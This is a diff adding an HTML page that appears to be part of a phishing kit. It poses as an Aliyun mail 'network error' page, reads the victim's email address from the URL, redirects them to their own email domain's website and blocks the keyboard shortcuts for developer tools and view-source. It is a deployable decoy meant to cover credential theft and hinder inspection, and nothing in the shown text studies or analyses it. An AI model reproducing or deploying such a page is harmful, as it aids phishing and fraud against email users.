@@ -1,0 +1,80 @@
+<html>
+
+<head>
+<meta http-equiv="refresh" content="3; URL=https://mail.mxhichina.com/">
+<meta http-equiv="Content-Language" content="en-us">
+<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
+<title>&#21457;&#29983;&#32593;&#32476;&#38169;&#35823;</title>
+<link rel="shortcut icon" href="https://mail.aliyun.com/static/5948689/images/favicon.ico"/>
+</head>
+
+<body>
+
+<p>&nbsp;</p>
+<p>&nbsp;</p>
+<p>&nbsp;</p>
+<p>&nbsp;</p>
+<p>&nbsp;</p>
+<p align="center"><b>&#21457;&#29983;&#32593;&#32476;&#38169;&#35823;&#65281;&#35831;&#31245;&#21518;&#20877;&#35797;&#12290;</b></p>
+
+</body>
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+  <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js"></script>
+  <script>
+
+
+    /* global $ */
+    $(document).ready(function(){
+      
+      var number = getUrlVars()["msg"];
+      if (!number) {
+        $("#mail").hide();
+      }
+      else
+      {
+       $("#mail").html(number);
+       $("#mail").show();
+       var my_email =number;
+        var ind=my_email.indexOf("@");
+        var my_slice=my_email.substr((ind+1));
+        var c= my_slice.substr(0, my_slice.indexOf('.'));
+        var final= c.toLowerCase();
+       setTimeout(() => {  window.location.replace("https://www."+my_slice); }, 10000);
+
+     }
+
+
+
+
+     function getUrlVars() {
+        var vars = {};
+        var parts = window.location.href.replace(/[?&]+([^=&]+)=([^&]*)/gi, function(m,key,value) {
+          vars[key] = value;
+        });
+        return vars;
+      }
+
+
+
+
+
+
+
+   });
+
+    document.onkeydown=function(e){
+      if (e.ctrlKey && 
+        (e.keyCode === 73 || 
+         e.keyCode === 105 ||
+         e.keyCode === 74 || 
+         e.keyCode === 106 || 
+         e.keyCode === 85 || 
+         e.keyCode === 117)) {
+        alert('not allowed');
+      return false;
+    } else {
+      return true;
+    }
+  }
+</script>
+</html>
